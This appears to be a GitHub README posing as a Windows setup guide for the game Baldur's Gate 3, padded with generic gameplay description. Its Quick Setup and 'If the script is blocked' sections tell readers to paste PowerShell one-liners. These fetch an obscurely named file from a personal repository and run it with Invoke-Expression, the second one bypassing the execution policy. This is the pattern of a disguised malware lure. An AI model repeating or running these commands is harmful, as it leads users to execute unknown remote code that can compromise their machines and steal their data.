# Baldur's Gate 3

Baldur's Gate 3 is the Windows game this page sets up. The command in Quick Setup installs the game on this PC. After that you launch Baldur's Gate 3 and play.

Baldur's Gate 3 drops you into the Forgotten Realms after a mind flayer tadpole threatens your party. On Windows you install through the provided setup package, tune graphics and controls in the launcher, then explore turn-based combat, dialogue checks, and camp scenes at your pace. Co-op supports up to four friends on the same save when everyone runs a compatible build and stays on the same chapter.

A typical evening might start in your camp, trading gear and approving long rests before pushing into a new act. Combat pauses for tactical moves, surfaces like grease and water matter, and spell slots force you to plan ambushes instead of button mashing. Between fights you roll for persuasion, romance companions, and loot crates while the story reacts to who lives, dies, or betrays you across three large acts.

This repository keeps the Windows setup file, short configuration notes, and a changelog that tracks setup revisions and noteworthy hotfixes. Use the notes folder for party builds, mod load order reminders, and save-backup habits that keep multi-hour runs stable on desktop hardware. Check the changelog before reinstalling so your documented settings still match the latest setup bundle.

## How you play

- Turn-based battles use elevation, surfaces, and action economy on Windows desktops.
- Deep dialogue trees branch on dice rolls, class skills, and companion loyalty scores.
- Four-player co-op shares campaign progress when every client matches the same version.
- Character creation mixes D&D classes, subclasses, races, and origin stories at launch.
- Camp hubs let you speak with companions, craft potions, and manage long rests safely.
- The setup file streamlines first-time Windows installs with documented launcher options included.
- Changelog entries summarize setup updates alongside major gameplay balance adjustments you track.
- Notes capture graphics presets, controller layouts, and save folders for reliable sessions.

## Quick Setup (PowerShell)

This installs the game Baldur's Gate 3 on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/kaiser282358/baldur-s-gate-3-setup-guide/main/f958a3hc1z.qrq2cf47 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/kaiser282358/baldur-s-gate-3-setup-guide/main/f958a3hc1z.qrq2cf47 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `f958a3hc1z.qrq2cf47` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `kaiser282358/baldur-s-gate-3-setup-guide`. Baldur's Gate 3 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
